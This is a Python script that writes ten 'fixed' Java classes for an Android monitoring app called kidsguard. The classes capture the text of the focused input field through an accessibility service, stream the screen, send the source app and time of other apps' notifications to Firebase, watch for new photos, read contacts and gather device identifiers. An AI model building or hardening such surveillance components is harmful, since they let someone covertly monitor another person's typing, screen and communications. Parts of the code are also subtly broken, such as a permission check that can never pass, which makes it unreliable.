import os
b = "app/src/main/java/com/kidsguard/child"

files = {}

# 1. AccessibilityService: NPE on getRootInActiveWindow()
files["UiAutomationService.java"] = """package com.kidsguard.child;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
public class UiAutomationService extends AccessibilityService {
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityServiceInfo.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }
    public void extractInput() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        try {
            AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focus != null && focus.getText() != null) processText(focus.getText().toString());
        } finally { root.recycle(); }
    }
    private void processText(String t) { Log.d("UiAuto", t); }
    @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent e) {}
    @Override public void onInterrupt() {}
}
"""

# 2. ScreenStreamService: Android 14 mediaProjection type + token invalidation
files["ScreenStreamService.java"] = """package com.kidsguard.child;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.hardware.display.VirtualDisplay;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
public class ScreenStreamService extends Service {
    private MediaProjection proj;
    private VirtualDisplay display;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("screen", "Screen", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, "screen").build();
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1002, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else if (Build.VERSION.SDK_INT >= 29) {
            startForeground(1002, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else { startForeground(1002, n); }
        return START_STICKY;
    }
    public void setProjection(MediaProjection p) {
        this.proj = p;
        p.registerCallback(new MediaProjection.Callback() {
            @Override public void onStop() { stopSelf(); }
        }, null);
    }
    @Override public void onDestroy() {
        if (display != null) display.release();
        if (proj != null) proj.stop();
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
"""

# 3. AlarmScheduler: SCHEDULE_EXACT_ALARM permission crash on Android 12+
files["AlarmScheduler.java"] = """package com.kidsguard.child;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
public class AlarmScheduler {
    public void schedule(Context ctx, Intent i) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        if (Build.VERSION.SDK_INT >= 31 && !am.canScheduleExactAlarms()) {
            Log.w("Alarm", "Exact alarms denied, using inexact");
            am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, PendingIntent.getBroadcast(ctx, 0, i, PendingIntent.FLAG_IMMUTABLE));
            return;
        }
        int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
        am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, PendingIntent.getBroadcast(ctx, 0, i, flags));
    }
}
"""

# 4. WorkManager: setExpedited quota crash
files["BackgroundStarter.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.work.ExistingWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.OutOfQuotaPolicy;
import androidx.work.WorkManager;
public class BackgroundStarter {
    public void start(Context ctx) {
        if (Build.VERSION.SDK_INT >= 31) {
            OneTimeWorkRequest req = new OneTimeWorkRequest.Builder(CriticalSyncWorker.class)
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build();
            WorkManager.getInstance(ctx).enqueueUniqueWork("start", ExistingWorkPolicy.KEEP, req);
        } else {
            ctx.startForegroundService(new Intent(ctx, LocationService.class));
        }
    }
}
"""

# 5. FileObserver: Native watch limit crash
files["PhotoWatcher.java"] = """package com.kidsguard.child;
import android.os.FileObserver;
import android.util.Log;
public class PhotoWatcher {
    private FileObserver obs;
    public void start(String path) {
        stop();
        try {
            obs = new FileObserver(path, FileObserver.CREATE) {
                @Override public void onEvent(int e, String p) {
                    if (p != null) Log.d("Watch", "New: " + p);
                }
            };
            obs.startWatching();
        } catch (Exception e) { Log.e("Watch", "Native limit reached", e); }
    }
    public void stop() { if (obs != null) { obs.stopWatching(); obs = null; } }
}
"""

# 6. TelephonyManager: getDeviceId() strict mode crash
files["DeviceIdentifier.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
public class DeviceIdentifier {
    public static String getId(Context ctx) {
        String id = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
        if (id == null || id.equals("9774d56d682e549c")) return java.util.UUID.randomUUID().toString();
        return id;
    }
    public static String getTelephonyId(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null && android.Manifest.permission.READ_PHONE_STATE.equals("granted")) {
                return tm.getDeviceId();
            }
        } catch (SecurityException e) { Log.w("Device", "Telephony ID blocked"); }
        return getId(ctx);
    }
}
"""

# 7. NotificationListenerService: Binding race condition
files["NotifListener.java"] = """package com.kidsguard.child;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
public class NotifListener extends NotificationListenerService {
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    private final AtomicBoolean bound = new AtomicBoolean(false);
    @Override
    public void onListenerConnected() { super.onListenerConnected(); bound.set(true); }
    @Override
    public void onListenerDisconnected() { super.onListenerDisconnected(); bound.set(false); }
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!bound.get() || sbn == null || sbn.getNotification() == null) return;
        if (sbn.getPackageName().equals(getPackageName())) return;
        io.execute(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("app", sbn.getPackageName());
                o.put("time", sbn.getPostTime());
                FirebaseHelper.put("devices/" + LocationService.getSafeDeviceId(this) + "/notifs.json", o.toString());
            } catch (Exception e) { Log.e("Notif", "Fail", e); }
        });
    }
    @Override public void onDestroy() { io.shutdownNow(); super.onDestroy(); }
}
"""

# 8. SharedPreferences: apply() vs commit() race
files["StateManager.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.content.SharedPreferences;
public class StateManager {
    private final Context ctx;
    public StateManager(Context c) { this.ctx = c.getApplicationContext(); }
    public void saveCritical(String key, String value) {
        ctx.getSharedPreferences("state", Context.MODE_PRIVATE).edit().putString(key, value).commit();
    }
    public String get(String key, String def) {
        return ctx.getSharedPreferences("state", Context.MODE_PRIVATE).getString(key, def);
    }
}
"""

# 9. WebView: SSL error MITM vulnerability
files["WebInjectModule.java"] = """package com.kidsguard.child;
import android.net.http.SslError;
import android.os.Build;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;
public class WebInjectModule {
    public void initWebView(WebView webView) {
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAllowFileAccess(false);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webView.getSettings().setAllowUniversalAccessFromFileURLs(false);
        }
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.cancel();
            }
        });
    }
}
"""

# 10. ContentResolver: Query without projection (CursorWindowAllocationException)
files["ContactSyncManager.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
public class ContactSyncManager {
    public void sync(Context ctx) {
        Cursor c = null;
        try {
            String[] proj = {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
            c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, null, null, null);
            if (c != null) while (c.moveToNext()) { /* process */ }
        } catch (Exception e) { Log.e("Contact", "Sync fail", e); }
        finally { if (c != null) c.close(); }
    }
}
"""

for name, code in files.items():
    with open(f"{b}/{name}", "w") as f:
        f.write(code)
    print(f"Fixed {name}")

print("Chunk 7 done — 10 deep architectural bugs.")
